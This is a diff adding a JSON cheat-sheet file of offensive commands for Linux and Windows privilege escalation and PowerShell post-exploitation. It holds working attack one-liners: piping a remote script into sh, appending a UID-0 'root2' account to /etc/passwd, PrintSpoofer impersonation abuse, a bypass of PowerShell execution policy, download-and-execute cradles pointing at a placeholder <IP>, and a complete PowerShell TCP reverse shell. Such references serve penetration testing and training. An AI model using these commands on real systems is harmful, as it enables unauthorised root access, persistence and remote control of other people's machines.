@@ -1,0 +1,40 @@
+{
+  "linux_privesc": {
+    "title": "Linux Privilege Escalation",
+    "category": "Privilege Escalation",
+    "desc": "Techniques to escalate from a standard shell to root.",
+    "steps": [
+      ["Check sudo permissions", "sudo -l"],
+      ["Find SUID binaries", "find / -perm -4000 -type f 2>/dev/null"],
+      ["Check cron schedules", "cat /etc/crontab; ls -la /etc/cron*"],
+      ["Kernel version audit", "uname -a"],
+      ["Searchsploit query", "searchsploit linux kernel <version>"],
+      ["Run LinPEAS", "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"],
+      ["Writable /etc/passwd trick", "openssl passwd -1 -salt xyz password123 && echo 'root2:HASH:0:0::/root:/bin/bash' >> /etc/passwd"]
+    ]
+  },
+  "windows_privesc": {
+    "title": "Windows Privilege Escalation",
+    "category": "Privilege Escalation",
+    "desc": "Techniques to escalate privileges on Windows hosts.",
+    "steps": [
+      ["Inspect user privileges", "whoami /priv"],
+      ["Inspect system information", "systeminfo"],
+      ["Find unquoted service paths", "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\""],
+      ["Inspect scheduled tasks", "schtasks /query /fo LIST /v"],
+      ["Run WinPEAS", "Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -OutFile winPEAS.exe; .\\winPEAS.exe"],
+      ["SeImpersonatePrivilege exploit", "PrintSpoofer.exe -i -c cmd"]
+    ]
+  },
+  "powershell": {
+    "title": "PowerShell - Post-Exploitation",
+    "category": "Privilege Escalation",
+    "desc": "Offensive PowerShell one-liners and download cradles.",
+    "steps": [
+      ["Bypass execution policy", "powershell -Exec Bypass"],
+      ["Download file cradle", "Invoke-WebRequest -Uri http://<IP>/payload.exe -OutFile payload.exe"],
+      ["In-memory script execution", "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')"],
+      ["TCP reverse shell", "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()\""]
+    ]
+  }
+}
